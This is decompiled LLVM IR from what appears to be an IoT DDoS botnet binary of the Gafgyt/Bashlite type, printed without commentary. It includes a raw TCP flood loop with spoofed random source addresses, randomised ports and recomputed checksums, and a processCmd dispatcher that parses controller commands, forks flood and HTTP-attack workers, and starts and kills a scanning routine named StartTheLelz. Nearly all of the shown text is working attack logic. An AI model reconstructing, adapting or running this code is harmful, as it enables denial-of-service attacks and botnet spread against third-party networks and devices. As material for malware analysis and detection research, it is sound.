  store i32 ptrtoint ([4 x i8]* @global_var_10011390.203 to i32), i32* @r4, align 4
  %v4_100056ac = call i32 @__GI_strcoll(i8* %v3_10005644, i32 ptrtoint ([4 x i8]* @global_var_10011390.203 to i32))
  %v3_100056b4 = icmp eq i32 %v4_100056ac, 0
  br i1 %v3_100056b4, label %dec_label_pc_100056bc, label %dec_label_pc_100056d0

dec_label_pc_100056bc:                            ; preds = %dec_label_pc_1000569c
  %v3_100056c0 = load i32, i32* %v2_10005590, align 16
  %v1_100056c4 = or i32 %v3_100056c0, 65536
  store i32 %v1_100056c4, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005734

dec_label_pc_100056d0:                            ; preds = %dec_label_pc_1000569c
  store i32 ptrtoint ([4 x i8]* @global_var_10011394.204 to i32), i32* @r4, align 4
  %v4_100056e0 = call i32 @__GI_strcoll(i8* %v3_10005644, i32 ptrtoint ([4 x i8]* @global_var_10011394.204 to i32))
  %v3_100056e8 = icmp eq i32 %v4_100056e0, 0
  br i1 %v3_100056e8, label %dec_label_pc_100056f0, label %dec_label_pc_10005704

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_100056d0
  %v3_100056f4 = load i32, i32* %v2_10005590, align 16
  %v1_100056f8 = or i32 %v3_100056f4, 1048576
  store i32 %v1_100056f8, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005734

dec_label_pc_10005704:                            ; preds = %dec_label_pc_100056d0
  store i32 ptrtoint ([4 x i8]* @global_var_10011398.205 to i32), i32* @r4, align 4
  %v4_10005714 = call i32 @__GI_strcoll(i8* %v3_10005644, i32 ptrtoint ([4 x i8]* @global_var_10011398.205 to i32))
  %v3_1000571c = icmp eq i32 %v4_10005714, 0
  br i1 %v3_1000571c, label %dec_label_pc_10005724, label %dec_label_pc_10005734

dec_label_pc_10005724:                            ; preds = %dec_label_pc_10005704
  %v3_10005728 = load i32, i32* %v2_10005590, align 16
  %v1_1000572c = or i32 %v3_10005728, 524288
  store i32 %v1_1000572c, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005734

dec_label_pc_10005734:                            ; preds = %dec_label_pc_10005704, %dec_label_pc_100056f0, %dec_label_pc_100056bc, %dec_label_pc_10005688, %dec_label_pc_10005654, %dec_label_pc_10005724
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268457796, i32* @lr, align 4
  %v4_10005740 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10005750 = icmp eq i32 %v4_10005740, 0
  br i1 %v3_10005750, label %dec_label_pc_10005758, label %dec_label_pc_10005634

dec_label_pc_10005758:                            ; preds = %dec_label_pc_10005734, %dec_label_pc_10005614, %dec_label_pc_100055c0
  %v0_10005758 = call i32 @rand_cmwc()
  %v1_10005768 = trunc i32 %v0_10005758 to i16
  %v3_10005768 = add i32 %v1_100054f8, 34
  %v4_10005768 = inttoptr i32 %v3_10005768 to i16*
  store i16 %v1_10005768, i16* %v4_10005768, align 2
  %v3_10005774 = add i32 %v1_100054f8, 36
  %v4_10005774 = inttoptr i32 %v3_10005774 to i16*
  store i16 0, i16* %v4_10005774, align 4
  %v3_10005780 = add i32 %v1_100054f8, 38
  %v4_10005780 = inttoptr i32 %v3_10005780 to i16*
  store i16 0, i16* %v4_10005780, align 2
  br i1 %v3_100053c0, label %dec_label_pc_10005790, label %dec_label_pc_100057a4

dec_label_pc_10005790:                            ; preds = %dec_label_pc_10005758
  %v0_10005790 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10005790 to i16
  br label %dec_label_pc_100057bc

dec_label_pc_100057a4:                            ; preds = %dec_label_pc_10005758
  %v1_100057a8 = urem i32 %arg2, 65536
  store i32 %v1_100057a8, i32* @r3, align 4
  %v1_100057b0 = call i32 @htons(i32 %v1_100057a8)
  %extract.t = trunc i32 %v1_100057b0 to i16
  br label %dec_label_pc_100057bc

dec_label_pc_100057bc:                            ; preds = %dec_label_pc_10005790, %dec_label_pc_100057a4
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_100057a4 ], [ %extract.t63, %dec_label_pc_10005790 ]
  %v3_100057c4 = add i32 %v1_100054f8, 22
  %v4_100057c4 = inttoptr i32 %v3_100057c4 to i16*
  store i16 %storemerge60.off0, i16* %v4_100057c4, align 2
  store i32 268457940, i32* @lr, align 4
  %v3_100057d0 = inttoptr i32 %v1_10005518 to i32*
  %v4_100057d0 = call i32 @tcpcsum(i32 %v1_100054f8, i32* %v3_100057d0, i32 %v1_10005518)
  %v1_100057dc = trunc i32 %v4_100057d0 to i16
  store i16 %v1_100057dc, i16* %v4_10005774, align 4
  %v1_100057ec = or i32 %v1_100054f8, 2
  %v2_100057ec = inttoptr i32 %v1_100057ec to i16*
  %v3_100057ec = load i16, i16* %v2_100057ec, align 2
  %v4_100057ec = zext i16 %v3_100057ec to i32
  %v5_100057fc = inttoptr i32 %v1_100054f8 to i16*
  %v6_100057fc = call i32 @csum(i16* %v5_100057fc, i32 %v4_100057ec, i32 %v1_100054f8, i32 6, i32 %v1_10005540)
  %sext3 = mul i32 %v6_100057fc, 65536
  %v1_10005800 = sdiv i32 %sext3, 65536
  %v1_10005808 = trunc i32 %v1_10005800 to i16
  %v3_10005808 = or i32 %v1_100054f8, 10
  %v4_10005808 = inttoptr i32 %v3_10005808 to i16*
  store i16 %v1_10005808, i16* %v4_10005808, align 2
  store i32 268458004, i32* @lr, align 4
  %v1_10005810 = call i32 @__GI_time(i32 0)
  %v2_1000581c = add i32 %v1_10005810, %arg3
  %v2_10005870 = or i32 %v1_100054f8, 12
  %v3_10005870 = inttoptr i32 %v2_10005870 to i32*
  %v3_10005884 = or i32 %v1_100054f8, 4
  %v4_10005884 = inttoptr i32 %v3_10005884 to i16*
  br label %dec_label_pc_10005830

dec_label_pc_10005830:                            ; preds = %dec_label_pc_10005830.backedge, %dec_label_pc_100057bc
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_100057bc ], [ %storemerge22, %dec_label_pc_10005830.backedge ]
  store i32 268458068, i32* @lr, align 4
  %v7_10005850 = call i32 @__libc_sendto(i32 %v3_1000543c, i32 %v1_100054f8, i32 %v1_100054c0, i32 0, i32 %v2_100053f4, i32 16, i32 %v2_100053f4)
  %v1_10005858 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10005858, i32* @r3, align 4
  %v1_10005864 = call i32 @htonl(i32 %v1_10005858)
  store i32 %v1_10005864, i32* %v3_10005870, align 4
  %v0_10005874 = call i32 @rand_cmwc()
  %v1_10005884 = trunc i32 %v0_10005874 to i16
  store i16 %v1_10005884, i16* %v4_10005884, align 4
  %v0_10005888 = call i32 @rand_cmwc()
  store i32 %v0_10005888, i32* %v3_1000557c, align 8
  %v0_10005898 = call i32 @rand_cmwc()
  %v1_100058a8 = trunc i32 %v0_10005898 to i16
  store i16 %v1_100058a8, i16* %v5_1000551c, align 4
  store i16 0, i16* %v4_10005774, align 4
  store i32 268458180, i32* @lr, align 4
  %v4_100058c0 = call i32 @tcpcsum(i32 %v1_100054f8, i32* %v3_100057d0, i32 %v1_10005518)
  %v1_100058cc = trunc i32 %v4_100058c0 to i16
  store i16 %v1_100058cc, i16* %v4_10005774, align 4
  %v3_100058dc = load i16, i16* %v2_100057ec, align 2
  %v4_100058dc = zext i16 %v3_100058dc to i32
  %v6_100058ec = call i32 @csum(i16* %v5_100057fc, i32 %v4_100058dc, i32 %v1_100054f8, i32 0, i32 %v2_100053f4)
  %v1_100058f8 = trunc i32 %v6_100058ec to i16
  store i16 %v1_100058f8, i16* %v4_10005808, align 2
  %v4_10005904 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_10005904, label %dec_label_pc_1000590c, label %dec_label_pc_10005930

dec_label_pc_1000590c:                            ; preds = %dec_label_pc_10005830
  store i32 268458260, i32* @lr, align 4
  %v1_10005910 = call i32 @__GI_time(i32 0)
  %v3_1000591c = icmp sgt i32 %v1_10005910, %v2_1000581c
  br i1 %v3_1000591c, label %dec_label_pc_10005940, label %dec_label_pc_10005830.backedge

dec_label_pc_10005830.backedge:                   ; preds = %dec_label_pc_1000590c, %dec_label_pc_10005930
  %storemerge22 = phi i32 [ %v1_10005934, %dec_label_pc_10005930 ], [ 0, %dec_label_pc_1000590c ]
  br label %dec_label_pc_10005830

dec_label_pc_10005930:                            ; preds = %dec_label_pc_10005830
  %v1_10005934 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10005830.backedge

dec_label_pc_10005940:                            ; preds = %dec_label_pc_1000590c, %dec_label_pc_10005458, %dec_label_pc_10005418, %dec_label_pc_100053f4
  %v0_10005968 = phi i32 [ %v5_10005478, %dec_label_pc_10005458 ], [ 0, %dec_label_pc_10005418 ], [ %v4_10005404, %dec_label_pc_100053f4 ], [ %v1_10005910, %dec_label_pc_1000590c ]
  ret i32 %v0_10005968

; uselistorder directives
  uselistorder i32 %v1_100057a8, { 1, 0 }
  uselistorder i32 %v4_10005740, { 1, 0 }
  uselistorder i32* %v2_10005590, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_10005540, { 1, 0 }
  uselistorder i32 %v1_10005518, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100054f8, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_100053f4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_100053e0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005830.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100057bc, { 1, 0 }
  uselistorder label %dec_label_pc_10005734, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10005634, { 1, 0 }
  uselistorder label %dec_label_pc_100054bc, { 1, 0 }
  uselistorder label %dec_label_pc_100053f4, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_100059a0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001139c.206 to i32), i32* @r4, align 4
  %v3_100059b0 = inttoptr i32 %v2_100059a0 to i8*
  %v4_100059b0 = call i32 @__GI_strcoll(i8* %v3_100059b0, i32 ptrtoint ([5 x i8]* @global_var_1001139c.206 to i32))
  %v3_100059b8 = icmp eq i32 %v4_100059b0, 0
  br i1 %v3_100059b8, label %dec_label_pc_10006544, label %dec_label_pc_100059c0

dec_label_pc_100059c0:                            ; preds = %entry
  %v2_100059c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_100113a4.207 to i32), i32* @r4, align 4
  %v3_100059d4 = inttoptr i32 %v2_100059c4 to i8*
  %v4_100059d4 = call i32 @__GI_strcoll(i8* %v3_100059d4, i32 ptrtoint ([6 x i8]* @global_var_100113a4.207 to i32))
  %v3_100059dc = icmp eq i32 %v4_100059d4, 0
  br i1 %v3_100059dc, label %dec_label_pc_100059e4, label %dec_label_pc_10005ad0

dec_label_pc_100059e4:                            ; preds = %dec_label_pc_100059c0
  %v1_100059e8 = add i32 %tmp, 4
  %v1_100059ec = inttoptr i32 %v1_100059e8 to i32*
  %v2_100059ec = load i32, i32* %v1_100059ec, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100113ac.208 to i32), i32* @r4, align 4
  %v3_100059fc = inttoptr i32 %v2_100059ec to i8*
  %v4_100059fc = call i32 @__GI_strcoll(i8* %v3_100059fc, i32 ptrtoint ([4 x i8]* @global_var_100113ac.208 to i32))
  %v3_10005a04 = icmp eq i32 %v4_100059fc, 0
  br i1 %v3_10005a04, label %dec_label_pc_10005a0c, label %dec_label_pc_10005a3c

dec_label_pc_10005a0c:                            ; preds = %dec_label_pc_100059e4
  %v3_10005a10 = load i32, i32* @global_var_10023540.209, align 4
  %v3_10005a14 = icmp eq i32 %v3_10005a10, 0
  br i1 %v3_10005a14, label %dec_label_pc_10006544, label %dec_label_pc_10005a1c

dec_label_pc_10005a1c:                            ; preds = %dec_label_pc_10005a0c
  store i32 268458544, i32* @lr, align 4
  %v2_10005a2c = call i32 @kill(i32 %v3_10005a10, i32 9)
  store i32 0, i32* @global_var_10023540.209, align 4
  br label %dec_label_pc_10005a3c

dec_label_pc_10005a3c:                            ; preds = %dec_label_pc_100059e4, %dec_label_pc_10005a1c
  %v2_10005a44 = load i32, i32* %v1_100059ec, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100113b0.210 to i32), i32* @r4, align 4
  %v3_10005a54 = inttoptr i32 %v2_10005a44 to i8*
  %v4_10005a54 = call i32 @__GI_strcoll(i8* %v3_10005a54, i32 ptrtoint ([3 x i8]* @global_var_100113b0.210 to i32))
  %v3_10005a5c = icmp eq i32 %v4_10005a54, 0
  br i1 %v3_10005a5c, label %dec_label_pc_10005a64, label %dec_label_pc_10005ad0

dec_label_pc_10005a64:                            ; preds = %dec_label_pc_10005a3c
  %v3_10005a68 = load i32, i32* @global_var_10023540.209, align 4
  %v3_10005a6c = icmp eq i32 %v3_10005a68, 0
  br i1 %v3_10005a6c, label %dec_label_pc_10005a74, label %dec_label_pc_10006544

dec_label_pc_10005a74:                            ; preds = %dec_label_pc_10005a64
  store i32 268458616, i32* @lr, align 4
  %v0_10005a74 = call i32 @__libc_fork()
  %v3_10005a94 = icmp eq i32 %v0_10005a74, 0
  br i1 %v3_10005a94, label %dec_label_pc_10005aac, label %dec_label_pc_10005a9c

dec_label_pc_10005a9c:                            ; preds = %dec_label_pc_10005a74
  store i32 %v0_10005a74, i32* @global_var_10023540.209, align 4
  br label %dec_label_pc_10006544

dec_label_pc_10005aac:                            ; preds = %dec_label_pc_10005a74
  %v3_10005ac4 = call i32 @StartTheLelz(i32 10, i32 1000, i32 -1)
  %v1_10005acc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005ad0

dec_label_pc_10005ad0:                            ; preds = %dec_label_pc_10005a3c, %dec_label_pc_100059c0, %dec_label_pc_10005aac
  %v2_10005ad4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_100113b4.212 to i32), i32* @r4, align 4
  %v3_10005ae4 = inttoptr i32 %v2_10005ad4 to i8*
  %v4_10005ae4 = call i32 @__GI_strcoll(i8* %v3_10005ae4, i32 ptrtoint ([5 x i8]* @global_var_100113b4.212 to i32))
  %v3_10005aec = icmp eq i32 %v4_10005ae4, 0
  br i1 %v3_10005aec, label %dec_label_pc_10005af4, label %dec_label_pc_10005c68

dec_label_pc_10005af4:                            ; preds = %dec_label_pc_10005ad0
  %tmp81 = icmp slt i32 %arg1, 6
  br i1 %tmp81, label %dec_label_pc_10006544, label %dec_label_pc_10005b00

dec_label_pc_10005b00:                            ; preds = %dec_label_pc_10005af4
  %v1_10005b04 = add i32 %tmp, 12
  %v1_10005b08 = inttoptr i32 %v1_10005b04 to i32*
  %v2_10005b08 = load i32, i32* %v1_10005b08, align 4
  store i32 268458772, i32* @lr, align 4
  %v2_10005b10 = call i32 @atol(i32 %v2_10005b08, i32 %v1_10005b04)
  %tmp82 = icmp slt i32 %v2_10005b10, 1
  br i1 %tmp82, label %dec_label_pc_10006544, label %dec_label_pc_10005b20

dec_label_pc_10005b20:                            ; preds = %dec_label_pc_10005b00
  %v1_10005b24 = add i32 %tmp, 20
  %v1_10005b28 = inttoptr i32 %v1_10005b24 to i32*
  %v2_10005b28 = load i32, i32* %v1_10005b28, align 4
  store i32 268458804, i32* @lr, align 4
  %v2_10005b30 = call i32 @atol(i32 %v2_10005b28, i32 %v1_10005b24)
  %v2_10005b38 = icmp sgt i32 %v2_10005b30, 0
  br i1 %v2_10005b38, label %dec_label_pc_10005b44, label %dec_label_pc_10006544

dec_label_pc_10005b44:                            ; preds = %dec_label_pc_10005b20
  store i32 268458824, i32* @lr, align 4
  %v0_10005b44 = call i32 @listFork()
  %v3_10005b4c = icmp eq i32 %v0_10005b44, 0
  br i1 %v3_10005b4c, label %dec_label_pc_10005b54, label %dec_label_pc_10006544

dec_label_pc_10005b54:                            ; preds = %dec_label_pc_10005b44
  %v3_10005b58 = load i32, i32* @global_var_10023510.27, align 4
  store i32 %v3_10005b58, i32* @r29, align 4
  %v1_10005b60 = add i32 %tmp, 4
  %v1_10005b64 = inttoptr i32 %v1_10005b60 to i32*
  %v1_10005b6c = add i32 %tmp, 8
  %v1_10005b70 = inttoptr i32 %v1_10005b6c to i32*
  %v2_10005b70 = load i32, i32* %v1_10005b70, align 4
  store i32 %v2_10005b70, i32* @r27, align 4
  %v2_10005b7c = load i32, i32* %v1_10005b08, align 4
  store i32 268458888, i32* @lr, align 4
  %v2_10005b84 = call i32 @atol(i32 %v2_10005b7c, i32 %v1_10005b04)
  %v2_10005b94 = load i32, i32* %v1_10005b28, align 4
  store i32 268458912, i32* @lr, align 4
  %v2_10005b9c = call i32 @atol(i32 %v2_10005b94, i32 %v1_10005b24)
  %v0_10005ba4 = load i32, i32* @r29, align 4
  %v0_10005bb0 = load i32, i32* @r28, align 4
  %v0_10005bb4 = load i32, i32* @r27, align 4
  %v0_10005bb8 = load i32, i32* @r26, align 4
  store i32 268458952, i32* @lr, align 4
  %v8_10005bc4 = call i32 @Rootsprintf(i32 %v0_10005ba4, i32 ptrtoint ([38 x i8]* @global_var_100113bc.213 to i32), i32 %v0_10005bb0, i32 %v0_10005bb4, i32 %v0_10005bb8, i32 %v2_10005b9c)
  %v2_10005bd0 = load i32, i32* %v1_10005b64, align 4
  store i32 %v2_10005bd0, i32* @r29, align 4
  %v2_10005bf0 = load i32, i32* %v1_10005b08, align 4
  store i32 268459004, i32* @lr, align 4
  %v2_10005bf8 = call i32 @atol(i32 %v2_10005bf0, i32 %v1_10005b04)
  %v1_10005c00 = urem i32 %v2_10005bf8, 65536
  store i32 %v1_10005c00, i32* @r27, align 4
  %v2_10005c1c = load i32, i32* %v1_10005b28, align 4
  store i32 268459048, i32* @lr, align 4
  %v2_10005c24 = call i32 @atol(i32 %v2_10005c1c, i32 %v1_10005b24)
  %v1_10005c30 = add i32 %tmp, 24
  %v1_10005c34 = inttoptr i32 %v1_10005c30 to i32*
  %v2_10005c34 = load i32, i32* %v1_10005c34, align 4
  store i32 268459072, i32* @lr, align 4
  %v2_10005c3c = call i32 @atol(i32 %v2_10005c34, i32 %v1_10005c30)
  %v0_10005c44 = load i32, i32* @r29, align 4
  %v0_10005c48 = load i32, i32* @r28, align 4
  %v0_10005c4c = load i32, i32* @r27, align 4
  %v0_10005c50 = load i32, i32* @r26, align 4
  %v0_10005c54 = load i32, i32* @r25, align 4
  %v6_10005c5c = trunc i32 %v0_10005c4c to i16
  %v7_10005c5c = call i32 @sendHTTP(i32 %v0_10005c44, i32 %v0_10005c48, i16 %v6_10005c5c, i32 %v0_10005c50, i32 %v0_10005c54, i32 %v2_10005c3c)
  %v0_10005c64 = call i32 @__GI_exit()
  br label %dec_label_pc_10005c68

dec_label_pc_10005c68:                            ; preds = %dec_label_pc_10005ad0, %dec_label_pc_10005b54
  %v2_10005c6c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100113e4.215 to i32), i32* @r4, align 4
  %v3_10005c7c = inttoptr i32 %v2_10005c6c to i8*
  %v4_10005c7c = call i32 @__GI_strcoll(i8* %v3_10005c7c, i32 ptrtoint ([4 x i8]* @global_var_100113e4.215 to i32))
  %v3_10005c84 = icmp eq i32 %v4_10005c7c, 0
  br i1 %v3_10005c84, label %dec_label_pc_10005c8c, label %dec_label_pc_10005fd4

dec_label_pc_10005c8c:                            ; preds = %dec_label_pc_10005c68
  %tmp83 = icmp slt i32 %arg1, 6
  br i1 %tmp83, label %dec_label_pc_10006544, label %dec_label_pc_10005c98

dec_label_pc_10005c98:                            ; preds = %dec_label_pc_10005c8c
  %v1_10005c9c = add i32 %tmp, 12
  %v1_10005ca0 = inttoptr i32 %v1_10005c9c to i32*
  %v2_10005ca0 = load i32, i32* %v1_10005ca0, align 4
  store i32 268459180, i32* @lr, align 4
  %v2_10005ca8 = call i32 @atol(i32 %v2_10005ca0, i32 %v1_10005c9c)
  %v4_10005cb4 = icmp eq i32 %v2_10005ca8, -1
  br i1 %v4_10005cb4, label %dec_label_pc_10006544, label %dec_label_pc_10005cbc

dec_label_pc_10005cbc:                            ; preds = %dec_label_pc_10005c98
  %v1_10005cc0 = add i32 %tmp, 8
  %v1_10005cc4 = inttoptr i32 %v1_10005cc0 to i32*
  %v2_10005cc4 = load i32, i32* %v1_10005cc4, align 4
  store i32 268459216, i32* @lr, align 4
  %v2_10005ccc = call i32 @atol(i32 %v2_10005cc4, i32 %v1_10005cc0)
  %v4_10005cd8 = icmp eq i32 %v2_10005ccc, -1
  br i1 %v4_10005cd8, label %dec_label_pc_10006544, label %dec_label_pc_10005ce0

dec_label_pc_10005ce0:                            ; preds = %dec_label_pc_10005cbc
  %v1_10005ce4 = add i32 %tmp, 16
  %v1_10005ce8 = inttoptr i32 %v1_10005ce4 to i32*
  %v2_10005ce8 = load i32, i32* %v1_10005ce8, align 4
  store i32 268459252, i32* @lr, align 4
  %v2_10005cf0 = call i32 @atol(i32 %v2_10005ce8, i32 %v1_10005ce4)
  %v4_10005cfc = icmp eq i32 %v2_10005cf0, -1
  br i1 %v4_10005cfc, label %dec_label_pc_10006544, label %dec_label_pc_10005d04

dec_label_pc_10005d04:                            ; preds = %dec_label_pc_10005ce0
  %v1_10005d08 = add i32 %tmp, 20
  %v1_10005d0c = inttoptr i32 %v1_10005d08 to i32*
  %v2_10005d0c = load i32, i32* %v1_10005d0c, align 4
  store i32 268459288, i32* @lr, align 4
  %v2_10005d14 = call i32 @atol(i32 %v2_10005d0c, i32 %v1_10005d08)
  %v4_10005d20 = icmp eq i32 %v2_10005d14, -1
  br i1 %v4_10005d20, label %dec_label_pc_10006544, label %dec_label_pc_10005d28

dec_label_pc_10005d28:                            ; preds = %dec_label_pc_10005d04
  %v2_10005d30 = load i32, i32* %v1_10005d0c, align 4
  store i32 268459324, i32* @lr, align 4
  %v2_10005d38 = call i32 @atol(i32 %v2_10005d30, i32 %v1_10005d08)
  %v3_10005d44 = icmp sgt i32 %v2_10005d38, 65536
  br i1 %v3_10005d44, label %dec_label_pc_10006544, label %dec_label_pc_10005d4c

dec_label_pc_10005d4c:                            ; preds = %dec_label_pc_10005d28
  %v2_10005d54 = load i32, i32* %v1_10005d0c, align 4
  store i32 268459360, i32* @lr, align 4
  %v2_10005d5c = call i32 @atol(i32 %v2_10005d54, i32 %v1_10005d08)
  %v3_10005d6c = icmp sgt i32 %v2_10005d5c, 65500
  br i1 %v3_10005d6c, label %dec_label_pc_10006544, label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d4c
  %v2_10005d7c = load i32, i32* %v1_10005ce8, align 4
  store i32 268459400, i32* @lr, align 4
  %v2_10005d84 = call i32 @atol(i32 %v2_10005d7c, i32 %v1_10005ce4)
  %v2_10005d8c = icmp sgt i32 %v2_10005d84, 32
  br i1 %v2_10005d8c, label %dec_label_pc_10006544, label %dec_label_pc_10005d94

dec_label_pc_10005d94:                            ; preds = %dec_label_pc_10005d74
  %v1_10005d98 = icmp slt i32 %arg1, 7
  %v3_10005d98 = icmp eq i32 %arg1, 7
  br i1 %v3_10005d98, label %dec_label_pc_10005da0, label %dec_label_pc_10005dc4

dec_label_pc_10005da0:                            ; preds = %dec_label_pc_10005d94
  %v1_10005da4 = add i32 %tmp, 24
  %v1_10005da8 = inttoptr i32 %v1_10005da4 to i32*
  %v2_10005da8 = load i32, i32* %v1_10005da8, align 4
  store i32 268459444, i32* @lr, align 4
  %v2_10005db0 = call i32 @atol(i32 %v2_10005da8, i32 %v1_10005da4)
  %v2_10005db8 = icmp sgt i32 %v2_10005db0, 0
  br i1 %v2_10005db8, label %dec_label_pc_10005dc4, label %dec_label_pc_10006544

dec_label_pc_10005dc4:                            ; preds = %dec_label_pc_10005d94, %dec_label_pc_10005da0
  %v1_10005dc8 = add i32 %tmp, 4
  %v1_10005dcc = inttoptr i32 %v1_10005dc8 to i32*
  %v2_10005dcc = load i32, i32* %v1_10005dcc, align 4
  %v2_10005ddc = load i32, i32* %v1_10005cc4, align 4
  store i32 268459496, i32* @lr, align 4
  %v2_10005de4 = call i32 @atol(i32 %v2_10005ddc, i32 %v1_10005cc0)
  %v2_10005df8 = load i32, i32* %v1_10005ca0, align 4
  store i32 268459524, i32* @lr, align 4
  %v2_10005e00 = call i32 @atol(i32 %v2_10005df8, i32 %v1_10005c9c)
  %v2_10005e14 = load i32, i32* %v1_10005ce8, align 4
  store i32 268459552, i32* @lr, align 4
  %v2_10005e1c = call i32 @atol(i32 %v2_10005e14, i32 %v1_10005ce4)
  %v2_10005e30 = load i32, i32* %v1_10005d0c, align 4
  store i32 268459580, i32* @lr, align 4
  %v2_10005e38 = call i32 @atol(i32 %v2_10005e30, i32 %v1_10005d08)
  br i1 %v1_10005d98, label %dec_label_pc_10005e74.thread, label %dec_label_pc_10005e74

dec_label_pc_10005e74.thread:                     ; preds = %dec_label_pc_10005dc4
  br label %dec_label_pc_10005ea4

dec_label_pc_10005e74:                            ; preds = %dec_label_pc_10005dc4
  %v1_10005e54 = add i32 %tmp, 24
  %v1_10005e58 = inttoptr i32 %v1_10005e54 to i32*
  %v2_10005e58 = load i32, i32* %v1_10005e58, align 4
  store i32 268459620, i32* @lr, align 4
  %v2_10005e60 = call i32 @atol(i32 %v2_10005e58, i32 %v1_10005e54)
  br i1 %v3_10005d98, label %dec_label_pc_10005ea4, label %dec_label_pc_10005e88

dec_label_pc_10005e88:                            ; preds = %dec_label_pc_10005e74
  %v1_10005e8c = add i32 %tmp, 28
  %v1_10005e90 = inttoptr i32 %v1_10005e8c to i32*
  %v2_10005e90 = load i32, i32* %v1_10005e90, align 4
  store i32 268459676, i32* @lr, align 4
  %v2_10005e98 = call i32 @atol(i32 %v2_10005e90, i32 %v1_10005e8c)
  br label %dec_label_pc_10005eb8

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005e74.thread, %dec_label_pc_10005e74
  %storemerge817 = phi i32 [ 1000, %dec_label_pc_10005e74.thread ], [ %v2_10005e60, %dec_label_pc_10005e74 ]
  br label %dec_label_pc_10005eb8

dec_label_pc_10005eb8:                            ; preds = %dec_label_pc_10005e88, %dec_label_pc_10005ea4
  %storemerge816 = phi i32 [ %storemerge817, %dec_label_pc_10005ea4 ], [ %v2_10005e60, %dec_label_pc_10005e88 ]
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_10005ea4 ], [ %v2_10005e98, %dec_label_pc_10005e88 ]
  %tmp85 = icmp slt i32 %arg1, 9
  br i1 %tmp85, label %dec_label_pc_10005ee8, label %dec_label_pc_10005ecc

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005eb8
  %v1_10005ed0 = add i32 %tmp, 32
  %v1_10005ed4 = inttoptr i32 %v1_10005ed0 to i32*
  %v2_10005ed4 = load i32, i32* %v1_10005ed4, align 4
  store i32 268459744, i32* @lr, align 4
  %v2_10005edc = call i32 @atol(i32 %v2_10005ed4, i32 %v1_10005ed0)
  br label %dec_label_pc_10005ef0

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005eb8
  br label %dec_label_pc_10005ef0

dec_label_pc_10005ef0:                            ; preds = %dec_label_pc_10005ecc, %dec_label_pc_10005ee8
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10005ee8 ], [ %v2_10005edc, %dec_label_pc_10005ecc ]
  store i32 %v2_10005dcc, i32* @r3, align 4
  store i32 268459784, i32* @lr, align 4
  %v2_10005f04 = call i32 @__GI_strchr(i32 %v2_10005dcc, i32 44)
  %v3_10005f0c = icmp eq i32 %v2_10005f04, 0
  br i1 %v3_10005f0c, label %dec_label_pc_10005f98, label %dec_label_pc_10005f14

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005ef0
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268459816, i32* @lr, align 4
  %v4_10005f24 = call i32 @__GI_strtok(i32 %v2_10005dcc, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10005f8c29 = icmp eq i32 %v4_10005f24, 0
  br i1 %v3_10005f8c29, label %dec_label_pc_10006544, label %dec_label_pc_10005f34

dec_label_pc_10005f34:                            ; preds = %dec_label_pc_10005f14, %dec_label_pc_10005f70
  %storemerge1530 = phi i32 [ %v4_10005f7c, %dec_label_pc_10005f70 ], [ %v4_10005f24, %dec_label_pc_10005f14 ]
  store i32 268459832, i32* @lr, align 4
  %v0_10005f34 = call i32 @listFork()
  %v3_10005f3c = icmp eq i32 %v0_10005f34, 0
